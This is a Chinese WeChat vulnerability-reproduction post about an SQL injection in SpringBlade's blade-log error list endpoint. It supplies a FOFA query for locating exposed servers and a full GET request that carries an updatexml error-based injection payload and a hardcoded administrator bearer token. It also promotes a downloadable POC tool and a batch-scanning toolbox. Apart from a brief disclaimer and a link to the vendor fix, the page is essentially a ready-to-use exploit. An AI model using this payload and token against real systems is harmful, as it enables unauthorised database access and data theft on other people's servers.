#  SpringBlade list接口存在SQL注入漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-03-12 22:05  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. SpringBlade简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.5 、Spring Cloud 2020 等核心技术构建，完全遵循阿里巴巴编码规范。  
## 2.漏洞描述  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.7 、Spring Cloud 2021 等核心技术构建，完 全遵循阿里巴巴编码规范。提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。SpringBlade list接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
SpringBlade  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhjVy4eNeQttWEnbUBTiahvszcJRKyUU7yMEibAu7A2dORmZiaayrOFSiavQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
SpringBlade list接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="https://bladex.vip"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/api/blade-log/error/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1  
  
漏洞数据包：  
```
GET /api/blade-log/error/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: */*
Connection: Keep-Alive
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhn0vkVBy54YeARKg3nWDBnFMCA0ibIqppejHyGMcNDQ83ibB8dtAJGHiaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhsm2JB0EH7f4qK57uVXyibMqaV6EDyJpia6wYP8cjoBPNaaBf3UqNAmFA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现108 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhwBxTULVOWFr4uqEhiaugoPDuO2LJHWJoibqShI2qD1856V743oFibbb8w/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhGYwjzceUoDoTemuBCNSviaoRu1uh4HETooBo5pNBciahr4REibecJbwKg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhxoGy4aPvLmw5e2GwIibIXQBbTmC0gVGUA48cpRlfsCpUcq63AB92ucA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhGFIclyrvzEtFxg1ndquibda5J8xC4FoxgzORwc4JcdiaNhdfbEvYcwDw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhwV68IanSRN83OQOQFwZWn3D1mm0VurhIFQibQbiabU8LuRQDIJDaJpQg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b9l0TRia1s82IuSaTWo3flhh3iaDteIqmLa9vvHDchgxVViaj4IkHpVcsCicGGRwfbPy4wcvYh35J9ibw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
⼚商已发布了漏洞修复程序 请及时关注更新：https://github.com/chillzhuang/blade-tool  
## 8.往期回顾  
  
[weiphp5.0存在远程代码执行漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485561&idx=1&sn=96af9d47d706278a7095c4a55a6b2f79&chksm=974b857ea03c0c68fcd16fb1b78573a8f459f88eb16948927764d02ce305b25999bcefe010ec&scene=21#wechat_redirect)  
  
  
[帮管客CRM jiliyu接口存在SQL漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485524&idx=1&sn=677302fa74ebb64eacd4d41198329aae&chksm=974b8553a03c0c4589fcfbef8abe3190a9e41cb5d42e3c54142f11c7528bfe9c3cacd6e919d0&scene=21#wechat_redirect)  
  
  
  
  
